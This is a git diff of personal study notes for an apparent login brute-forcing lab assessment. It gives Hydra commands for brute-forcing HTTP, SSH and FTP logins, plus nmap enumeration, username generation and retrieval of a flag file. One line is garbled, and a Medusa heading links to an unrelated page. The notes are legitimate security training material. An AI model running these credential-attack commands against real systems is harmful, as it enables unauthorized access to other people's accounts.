@@ -48,12 +48,17 @@ Therefore, the `params` string would be:
  
 Resulting in - `hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt -f IP -s 5000 http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"`
 
-Hydra Flow -
-- Brute force http: `hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt http://83.136.252.13 -s 38252 http-get`
-- Brute force ssh: `hydra -l satwossh -P 2023-200_most_used_passwords.txt 94.237.52.228 -s 56874 ssh -I`
+Hydra Workflow - (Login Brute forcing Skills Assessment)
+- Brute force http: `hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt 83.136.255.230 -s 55891 http-get` (Finds username + password, use in the browser prompt to see webpage which reveals SSH username)
+- Brute force ssh: `hydra -l satwossh -P 2023-200_most_used_passwords.txt 94.237.52.228 -s 56874 ssh -I` (Finds username + password for SSH connection)
 - Login with ssh: `ssh satwossh@94.237.52.228 -p 56874`
-- Brute force ftp: `hydra -L username-anarchy/TM.txt -P passwords.txt -s 21 -V localhost ftp`
-- Login with ftp: `ftp 'ftp://thomas:chocolate!@localhost:21'` or `ftp ftp://thomas:chocolate!@localhost:21` or `ftp localhost` or any kind of abbreviation the server accepts - will need to try a few. Even `ftp <IP>` should sometimes prompt a login,
+- Enumerate localhost: `nmap localhost`
+- User anarchy `Thomas Smith` name: `./username-anarchy Thomas Smith > TM.txt`
+- Brute force ftp: `hydra -L username-anarchy/TM.txt -P passwords.txt -s 21 -V localhost ftp` (Finds username + password for Thomas)
+- Login with ftp: `ftp 'ftp://thomas:chocolate!@localhost:21'` or `ftp ftp://thomas:chocolate!@localhost:21` or `ftp localhost` or any kind of abbreviation the server accepts - will need to try a few. Even `ftp <IP>` should sometimes prompt a login.
+- `ls -la` to see all files.
+- `get flag.txt` to put file in SSH shell
+- exitexitexit cat flag.txt
 
 # [Medusa]([url](https://docs.medusajs.com/learn/fundamentals/modules))
 - `man medusa`
